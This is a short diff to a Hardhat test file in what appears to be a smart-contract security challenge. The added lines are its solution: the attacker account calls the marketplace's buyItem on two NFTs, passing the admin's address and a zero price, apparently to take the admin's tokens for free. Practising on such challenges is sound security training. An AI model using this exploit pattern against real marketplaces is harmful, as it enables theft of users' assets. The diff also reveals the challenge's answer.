@@ -66,6 +66,11 @@ before(async () => {
 it("solves the challenge", async function () {
 
   // implement solution here
+  await bonanzaMarketplace.connect(attacker).buyItem(nftA.address, 0, adminUser.getAddress(), 0);
+
+  await bonanzaMarketplace
+    .connect(attacker)
+    .buyItem(nftB.address, 0, adminUser.getAddress(), 0);
 
 });
 
